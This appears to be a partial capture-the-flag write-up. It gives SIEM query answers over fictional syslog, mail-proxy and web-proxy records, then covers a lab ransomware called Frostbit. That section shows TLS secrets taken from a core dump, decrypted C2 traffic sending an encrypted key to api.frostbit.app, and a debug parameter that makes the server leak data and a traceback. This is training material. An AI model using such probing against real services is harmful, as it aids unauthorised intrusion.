  "log.syslog.severity.name.text": [
    "notice"
  ],
  "tags": [
    "match"
  ],
  "type": [
    "syslog"
  ],
  "_id": "1b4f83cb09f6ca81d5a58ccb916172410d74784c",
  "_index": ".ds-logs-generic-default-2025.11.05-000001",
  "_score": null
}
```

```txt
event.port_dst
```

 Question 6: Which event_source is related to email traffic?

```sql
event_source: "SnowGlowMailPxy"
```

```txt
SnowGlowMailPxy
```

 Question 7: Looking at the event source from the last question, what is the name of the field that contains the actual email text?


```sql
event_source: "SnowGlowMailPxy"
```

```json
{
  "@timestamp": [
    "2024-09-16T16:01:28.000Z"
  ],
  "@version": [
    "1"
  ],
  "data_stream.dataset": [
    "generic"
  ],
  "data_stream.namespace": [
    "default"
  ],
  "data_stream.type": [
    "logs"
  ],
  "event_source": [
    "SnowGlowMailPxy"
  ],
  "event.Body": [
    "Dear elf_user03,\n\nI hope this email finds you in good spirits. I wanted to inform you that it is time for the performance reviews for this quarter. Please make sure all the necessary documents and evaluations are completed and submitted by the deadline, which is next Friday. \n\nBest regards,\nelf_user05\n"
  ],
  "event.From": [
    "elf_user05@northpole.local"
  ],
  "event.Message-ID": [
    "<9EE973CD-029D-4F86-B3B3-D1A9DCCC74BC@SecureElfGwy.northpole.local>"
  ],
  "event.OpcodeDisplayNameText": [
    "Unknown"
  ],
  "event.Received_Time": [
    "2024-09-16T12:01:28-04:00"
  ],
  "event.ReceivedIP1": [
    "172.24.25.25"
  ],
  "event.ReceivedIP2": [
    "172.24.25.20"
  ],
  "event.Return-Path": [
    "elf_user05@northpole.local"
  ],
  "event.Subject": [
    "Performance Reviews"
  ],
  "event.To": [
    "elf_user03@northpole.local"
  ],
  "host.ip": [
    "172.18.0.5"
  ],
  "hostname": [
    "SecureElfGwy"
  ],
  "log.syslog.facility.code": [
    1
  ],
  "log.syslog.facility.name": [
    "user-level"
  ],
  "log.syslog.facility.name.text": [
    "user-level"
  ],
  "log.syslog.severity.code": [
    5
  ],
  "log.syslog.severity.name": [
    "notice"
  ],
  "log.syslog.severity.name.text": [
    "notice"
  ],
  "tags": [
    "match"
  ],
  "type": [
    "syslog"
  ],
  "_id": "acd44c1fdf34efef5fa14476efdef586956af8c9",
  "_index": ".ds-logs-generic-default-2025.11.05-000001",
  "_score": null
}
```

```txt
event.Body
```

 Question 8: Using the 'GreenCoat' event_source, what is the only value in the hostname field?

```sql
event_source: GreenCoat
```

```json
{
  "@timestamp": [
    "2024-09-16T15:36:26.000Z"
  ],
  "@version": [
    "1"
  ],
  "data_stream.dataset": [
    "generic"
  ],
  "data_stream.namespace": [
    "default"
  ],
  "data_stream.type": [
    "logs"
  ],
  "event_source": [
    "GreenCoat"
  ],
  "event.additional_info": [
    "outgoing via 172.24.25.25"
  ],
  "event.host": [
    "SnowSentry"
  ],
  "event.http_protocol": [
    "HTTP/1.1"
  ],
  "event.ip": [
    "172.24.25.93"
  ],
  "event.method": [
    "CONNECT"
  ],
  "event.OpcodeDisplayNameText": [
    "Unknown"
  ],
  "event.protocol": [
    "HTTPS"
  ],
  "event.response_size": [
    0
  ],
  "event.status_code": [
    200
  ],
  "event.timestamp": [
    "2024-09-16T15:36:26.000Z"
  ],
  "event.url": [
    "fastlane.rubiconproject.com:443"
  ],
  "event.user_identifier": [
    "elf_user03"
  ],
  "host.ip": [
    "172.18.0.5"
  ],
  "hostname": [
    "SecureElfGwy"
  ],
  "log.syslog.facility.code": [
    1
  ],
  "log.syslog.facility.name": [
    "user-level"
  ],
  "log.syslog.facility.name.text": [
    "user-level"
  ],
  "log.syslog.severity.code": [
    5
  ],
  "log.syslog.severity.name": [
    "notice"
  ],
  "log.syslog.severity.name.text": [
    "notice"
  ],
  "tags": [
    "match"
  ],
  "type": [
    "syslog"
  ],
  "_id": "9d9036d19ff81e440513998cc11f8f99bac838b2",
  "_index": ".ds-logs-generic-default-2025.11.05-000001",
  "_score": null
}
```

``txt
SecureElfGwy
```
 Question 9: Using the 'GreenCoat' event_source, what is the name of the field that contains the site visited by a client in the network?

```json
  "event.url": [
    "fastlane.rubiconproject.com:443"
  ],
```

```txt
event.url
```
Question 10: Using the 'GreenCoat' event_source, which unique URL and port (URL:port) did clients in the TinselStream network visit most?

```sql
event_source: 'GreenCoat'
```

```txt
pagead2.googlesyndication.com:443
```

Question 11: Using the 'WindowsEvent' event_source, how many unique Channels is the SIEM receiving Windows event logs from?

## Deactivate Frostbit

`DoNotAlterOrDeleteMe.frostbit.json`

```json
{"digest":"800080a028d5c00a930180804ee08101","status":"Key Set","statusid":"2hIOSG59QY2aVV0IxOIA"}
```

```
file frostbit_core_dump.13
frostbit_core_dump.13: ELF 64-bit LSB core file, x86-64, version 1 (SYSV)
```

```sh
CLIENT_HANDSHAKE_TRAFFIC_SECRET bda83d8ca7016c3f26fb92751a557e2e9e11a81e15fa88421bce6564129326c0 402e0169e672fe8104bdd0448b7c0af5e0290568fee554c848e696582b661096
SERVER_HANDSHAKE_TRAFFIC_SECRET bda83d8ca7016c3f26fb92751a557e2e9e11a81e15fa88421bce6564129326c0 0fbf25773c35e89d6a060358340b5c1a7ff18686ba29587e0aa247b9c281665c
CLIENT_TRAFFIC_SECRET_0 bda83d8ca7016c3f26fb92751a557e2e9e11a81e15fa88421bce6564129326c0 66360129de147203c8cb99f06a38a607f0e0585236731669c0cbf8930200bc27
SERVER_TRAFFIC_SECRET_0 bda83d8ca7016c3f26fb92751a557e2e9e11a81e15fa88421bce6564129326c0 c13c0b25473e8268b20df0f9d6133f3e139c57227997b67f5037a4dfe7562d63

POST /api/v1/bot/53dc1b09-db05-440f-8185-028e3c5f22fc/key HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Content-Length: 1070
Content-Type: application/json
Accept-Encoding: gzip
{"encryptedkey":"12261d88057896f925f65d5f1e4a0649457800b07b386ee2525946805df6ae8028b1a4cd224d8de2fbadd68f18ec56efe38eadbec14e77653da365eded7516f27987159e1a7e64f2d6fae8b65269f906c8b4c3fc82900600e0903d14e16955b48d3bd34be7c692ae433f02289f9a59989412462eae5d04911c36fe72745557e9173878a3b29a9220acee005c991517d569e4e8b968f6cdcd902ebaad69c33ea4bd4fdda866e48b6d5f70e34001b25acc6602399bad19bd06902dfc340dedf88bc6cc1041c96010d7dc95208e2a57e0df2efcdc7e4479d5333fcf4bfef809a9d5616af3fa9c535d66afae3f6ddbeb2a2db9651a5207e143a58c00cc1bfeefb70b0afc66a0a9bee0c78dfc9abcadae6f20c157de9453677055c50993467d1f3e5b2425f70d8b32012f5bbeebdb75e33a7959ce6de5d4e211b5dfdeb65927818e2be4596d021632a08e4c79933e3951710ddcdb9491bba50275d1e67128e9bf3cf5e2efe62e0153df757bb2fc21918d6e71862eaff97003adab4463894e812c8fe010750d33c81715fa7a44a8c53449adde7838ad1f6f29396fae3a59f97f569056341aad5ae1ec88968a5bcf6e209621744a043613b4470dd1828aea9fc41e03aed521241d25812cfa70f7a908414a465adb6b819a724e8f35ffa1158097e409f8b20af3a10b203e16325b03fb406ceffd846c7052a65e3f52184fba8e0103e049","nonce":""}

{"digest":"800080a028d5c00a930180804ee08101","status":"Key Set","statusid":"2hIOSG59QY2aVV0IxOIA"}

User-Agent: Go-http-client/1.1
GET /api/v1/bot/53dc1b09-db05-440f-8185-028e3c5f22fc/session HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip
POST /api/v1/bot/53dc1b09-db05-440f-8185-028e3c5f22fc/key HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Content-Length: 1070
Content-Type: application/json
Accept-Encoding: gzip
{"encryptedkey":"12261d88057896f925f65d5f1e4a0649457800b07b386ee2525946805df6ae8028b1a4cd224d8de2fbadd68f18ec56efe38eadbec14e77653da365eded7516f27987159e1a7e64f2d6fae8b65269f906c8b4c3fc82900600e0903d14e16955b48d3bd34be7c692ae433f02289f9a59989412462eae5d04911c36fe72745557e9173878a3b29a9220acee005c991517d569e4e8b968f6cdcd902ebaad69c33ea4bd4fdda866e48b6d5f70e34001b25acc6602399bad19bd06902dfc340dedf88bc6cc1041c96010d7dc95208e2a57e0df2efcdc7e4479d5333fcf4bfef809a9d5616af3fa9c535d66afae3f6ddbeb2a2db9651a5207e143a58c00cc1bfeefb70b0afc66a0a9bee0c78dfc9abcadae6f20c157de9453677055c50993467d1f3e5b2425f70d8b32012f5bbeebdb75e33a7959ce6de5d4e211b5dfdeb65927818e2be4596d021632a08e4c79933e3951710ddcdb9491bba50275d1e67128e9bf3cf5e2efe62e0153df757bb2fc21918d6e71862eaff97003adab4463894e812c8fe010750d33c81715fa7a44a8c53449adde7838ad1f6f29396fae3a59f97f569056341aad5ae1ec88968a5bcf6e209621744a043613b4470dd1828aea9fc41e03aed521241d25812cfa70f7a908414a465adb6b819a724e8f35ffa1158097e409f8b20af3a10b203e16325b03fb406ceffd846c7052a65e3f52184fba8e0103e049","nonce":""}
```

```http
GET /api/v1/bot/53dc1b09-db05-440f-8185-028e3c5f22fc/session HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Accept-Encoding: gzip


HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Thu, 06 Nov 2025 05:01:22 GMT
Content-Type: application/json
Content-Length: 29
Connection: keep-alive
Strict-Transport-Security: max-age=31536000

{"nonce":"c006a5ad0ebd8b10"}

POST /api/v1/bot/53dc1b09-db05-440f-8185-028e3c5f22fc/key HTTP/1.1
Host: api.frostbit.app
User-Agent: Go-http-client/1.1
Content-Length: 1070
Content-Type: application/json
Accept-Encoding: gzip

{"encryptedkey":"12261d88057896f925f65d5f1e4a0649457800b07b386ee2525946805df6ae8028b1a4cd224d8de2fbadd68f18ec56efe38eadbec14e77653da365eded7516f27987159e1a7e64f2d6fae8b65269f906c8b4c3fc82900600e0903d14e16955b48d3bd34be7c692ae433f02289f9a59989412462eae5d04911c36fe72745557e9173878a3b29a9220acee005c991517d569e4e8b968f6cdcd902ebaad69c33ea4bd4fdda866e48b6d5f70e34001b25acc6602399bad19bd06902dfc340dedf88bc6cc1041c96010d7dc95208e2a57e0df2efcdc7e4479d5333fcf4bfef809a9d5616af3fa9c535d66afae3f6ddbeb2a2db9651a5207e143a58c00cc1bfeefb70b0afc66a0a9bee0c78dfc9abcadae6f20c157de9453677055c50993467d1f3e5b2425f70d8b32012f5bbeebdb75e33a7959ce6de5d4e211b5dfdeb65927818e2be4596d021632a08e4c79933e3951710ddcdb9491bba50275d1e67128e9bf3cf5e2efe62e0153df757bb2fc21918d6e71862eaff97003adab4463894e812c8fe010750d33c81715fa7a44a8c53449adde7838ad1f6f29396fae3a59f97f569056341aad5ae1ec88968a5bcf6e209621744a043613b4470dd1828aea9fc41e03aed521241d25812cfa70f7a908414a465adb6b819a724e8f35ffa1158097e409f8b20af3a10b203e16325b03fb406ceffd846c7052a65e3f52184fba8e0103e049","nonce":"c006a5ad0ebd8b10"}
HTTP/1.1 200 OK
Server: nginx/1.27.1
Date: Thu, 06 Nov 2025 05:01:22 GMT
Content-Type: application/json
Content-Length: 99
Connection: keep-alive
Strict-Transport-Security: max-age=31536000

{"digest":"800080a028d5c00a930180804ee08101","status":"Key Set","statusid":"2hIOSG59QY2aVV0IxOIA"}
```

```sh
https://api.frostbit.app/view/2hIOSG59QY2aVV0IxOIA/53dc1b09-db05-440f-8185-028e3c5f22fc/status?digest=800080a028d5c00a930180804ee08101
```

```sh
https://api.frostbit.app/view/2hIOSG59QY2aVV0IxOIA/53dc1b09-db05-440f-8185-028e3c5f22fc/status?digest=800080a028d5c00a930180804ee08101&debug=true
```

```json
{"uuid": "53dc1b09-db05-440f-8185-028e3c5f22fc", "nonce": "REDACTED", "encryptedkey": "REDACTED", "deactivated": false,  "etime": 1766534400}```
```

```json
'Status Id File Digest Validation Error: Traceback (most recent call last):\n  File "/app/frostbit/ransomware/static/FrostBiteHashlib.py", line 55, in validate\n    decoded_bytes = binascii.unhexlify(hex_string)\nbinascii.Error: Odd-length string\n'
```

## Decrypt The Naughty List

I have not completed this challenge yet.
